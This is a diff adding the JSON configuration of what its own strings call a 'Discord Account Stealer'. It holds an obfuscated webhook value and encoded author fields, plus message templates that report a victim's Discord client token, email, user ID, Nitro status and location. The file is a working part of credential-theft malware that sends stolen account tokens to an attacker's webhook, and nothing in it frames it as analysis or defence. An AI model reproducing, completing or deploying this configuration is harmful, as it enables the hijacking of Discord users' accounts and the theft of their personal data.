@@ -1,0 +1,23 @@
+{
+    "token": "G1UYB-GETF6",
+    "version": "2.1",
+    "CreationDate": "Sat 10/02/2021 15:36",
+    "author": {
+        "APPNickname": "2NVeczB1wuXjNtFDwvrku7Yz8Qe6wvrkWcg5HQHNu7YzOMpOczB17T1bwuXj",
+        "username": "F3V1HQHN7T1bJyb3wvrkNtFDHQHNGCzwJkiOnTGlWl7efcqL",
+        "ID": "RdwmWl7eJkiOJkiOUOHKRdwmRdwmYlSM9LNmfcqLnTGlJkiOUOHKYlSMm1yzfcqLnTGl9LNm",
+        "webhook": "9LNmnTGlLQBYUOHKRdwmm1yzfcqLm1yzUOHK9LNmJkiOUOHKUOHKWl7em1yzWl7enTGlYlSMBwgHIzi3Ae7iSRFggVznZGZfBkjoIzi38Qe68Qe6v3POCqs0ZGZfNtFDbysRNtFDIzi3Wxx0OMpOWl7eEoZ3SRFg5uhI1Omyco88czB1AhLhwvrkwf9R7T1bi75bi75bIzi3BkjoWxx0HJ2AIzi3e8UpJyb3m2gd4e4O5uhICqs08Qe6DxBN62p0DxBNRdwm2NVeAe7ihGdpwvrk7T1bm1yzRdwmRaNH8Qe61OmyRaNHwf6znTGl4e4OYlSMZGZfwvrkgVzni75b1OmywuXj",
+        "notifications": false,
+        "premium": false
+    },
+    "Embed": {
+        "ErrorColor": "#e94949",
+        "SuccessColor": "#49e959",
+        "MessageTitle": "Discord Account | {username}",
+        "ErrorMessageTitle": "Discord Account Stealer | ERROR",
+        "ErrorMessageBody": ":bookmark_tabs: __**ERROR:**__\\n:x: **{error}**\\n\\n :id: __**IDENTIFIER**__\\n**TOKEN:** {IdentifierToken}\\n**OWNED BY:** {IdentifierOwner}\\n**Creation Date:** {IdentifierCreationDate}\\n**Version:** {IdentifierVersion}",
+        "MessageBody": "__**:clipboard: Account Details:**__\\n\\n**:blue_book: AT:** _{location}_\\n\\n**:bust_in_silhouette: User:** {username}\\n\\n**:id: Client ID:** {userID}\\n\\n**:moneybag: Has Nitro:** {HasNitro}\\n\\n**:mailbox_with_mail: Email:** {email}{spoiler}\\n\\n**:key: Client Token:**\\n||{token}||\\n\\n :id: __**IDENTIFIER**__\\n**TOKEN:** {IdentifierToken}\\n**OWNED BY:** {IdentifierOwner}\\n**Creation Date:** {IdentifierCreationDate}\\n**Version:** {IdentifierVersion}",
+        "ErrorImageURL": "https://i.imgur.com/rkY9LTw.png",
+        "SuccessImageURL": "{ImageURL}"
+    }
+}
